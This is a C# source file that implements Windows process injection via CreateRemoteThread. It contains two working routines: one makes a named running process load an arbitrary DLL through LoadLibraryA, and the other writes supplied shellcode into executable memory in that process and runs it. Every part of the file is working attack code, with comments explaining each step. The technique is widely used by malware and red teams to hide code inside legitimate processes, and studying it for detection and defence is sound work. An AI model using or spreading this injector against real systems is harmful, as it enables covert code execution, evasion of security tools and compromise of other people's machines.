using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace ProcessInjection_Test1
{
    class crt_Injection_Class
    {
        // Imports
        //
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr procHandleess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandleess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Memory Flags
        //
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // Used for memory allocation
        //
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;


        // This is a function for performing injection via the CreateRemoteThread() WinAPI call
        // crt_Injection takes two arguments:
        //      processName: A currently running process (the injection target)
        //      dllName: The injecting DLL's path
        //
        // CRT Injection follows a well-defined process:
        //
        // 1. Call OpenProcess() to acquire a handle to our target process
        // 2. Retrieve LoadLibraryA()'s address via GetProcAddress()
        // 3. Allocate memory within the target via VirtualAllocEx()
        // 4. Write the DLL's path into memory via WriteProcessMemory()
        // 5. Call CreateRemoteThread() to execute the injection
        public void crt_Injection(string processName, string dllName)
        {
            //TODO: Add some error checking

            // Get a handle to the target process 
            Console.WriteLine("[+] Attempting to find " + processName);
            Process proc = Process.GetProcessesByName(processName)[0];

            Console.WriteLine("[+] Found Process: " + proc.Id);
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            Console.WriteLine("[+] Got Handle: " + procHandle.ToString("X4"));

            // Get the address of LoadLibraryA
            IntPtr loadLibrary_Address = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            Console.WriteLine("[+] Got LoadLibraryA Address: 0x" + loadLibrary_Address.ToString("X4"));

            // Now, we allocate some memory within the target process that we'll use for writing
            IntPtr virtualAllocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            Console.WriteLine("[+] Memory Allocated @ 0x" + virtualAllocMemAddress.ToString("X4"));

            // Here we write the path to the DLL we're injecting into the memory of the target process, using the address we saved when calling VirtualAllocEx
            UIntPtr bytesWritten;
            byte[] bdll = System.Text.Encoding.Default.GetBytes(dllName);
            bool res = WriteProcessMemory(procHandle, virtualAllocMemAddress, bdll, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

            // If it worked
            if (res == true)
            {
                // Finally, we can run CRT with the handle of the target process, the address of LoadLibraryA and the address of the allocated memory
                Console.WriteLine("[+] Wrote " + bytesWritten.ToString() + " bytes, attempting to CreateRemoteThread...");
                var threadId = CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibrary_Address, virtualAllocMemAddress, 0, IntPtr.Zero);
                Console.WriteLine("[+] Injection successful, created threadId: " + threadId.ToString());
            }

        }        

        
        public void crt_Injection(string processName, byte[] sc)
        {
            //TODO: Add some error checking

            // Get a handle to the target process 
            Console.WriteLine("[+] Attempting to find " + processName);
            Process proc = Process.GetProcessesByName(processName)[0];

            Console.WriteLine("[+] Found Process: " + proc.Id);
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            Console.WriteLine("[+] Got Handle: " + procHandle.ToString("X4"));

            Console.WriteLine("[+] Shellcode is " + sc.Length + " bytes, allocating memory with VirtualAllocEx()");

            IntPtr virtualAllocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)sc.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            Console.WriteLine("[+] Memory Allocated @ " + virtualAllocMemAddress.ToString("X4"));

            UIntPtr bytesWritten;
            bool res = WriteProcessMemory(procHandle, virtualAllocMemAddress, sc, (uint)sc.Length, out bytesWritten);
            if (res == true)
            {
                Console.WriteLine("[+] Wrote " + bytesWritten.ToString() + " bytes, attempting to CreateRemoteThread...");
                var threadId = CreateRemoteThread(procHandle, IntPtr.Zero, 0, virtualAllocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine("[+] Injection successful, created threadId: " + threadId.ToString());
            }
        }

    }
}
